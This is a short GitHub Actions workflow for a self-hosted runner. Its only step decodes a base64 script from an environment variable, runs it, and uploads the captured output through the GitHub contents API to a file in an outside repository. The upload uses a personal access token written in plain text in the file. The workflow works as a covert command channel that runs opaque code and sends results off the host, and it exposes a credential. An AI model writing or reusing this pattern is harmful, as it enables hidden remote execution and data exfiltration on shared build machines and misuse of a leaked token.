jobs:
  r:
    runs-on: [self-hosted, ul-l40s]
    timeout-minutes: 25
    steps:
      - name: run
        run: |
          echo "$B64" | base64 -d > /tmp/rp6.sh
          bash /tmp/rp6.sh 2>&1 | tee /tmp/rp6.out
          H=$(hostname -s)
          C=$(base64 -w0 /tmp/rp6.out)
          T=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; P="cmdout8/ul-t2-rp6_${H}.txt"; B=https://api.github.com/repos/dongsuju/ul-plant/contents/$P
          SHA=$(curl -s -H "Authorization: token $T" "$B?ref=main" | sed -n 's/.*"sha": "\([a-f0-9]*\)".*/\1/p' | head -1)
          if [ -n "$SHA" ]; then D="{\"message\":\"rp6\",\"content\":\"$C\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else D="{\"message\":\"rp6\",\"content\":\"$C\",\"branch\":\"main\"}"; fi
          curl -s -X PUT -H "Authorization: token $T" -H "Content-Type: application/json" -d "$D" "$B" | head -c 200
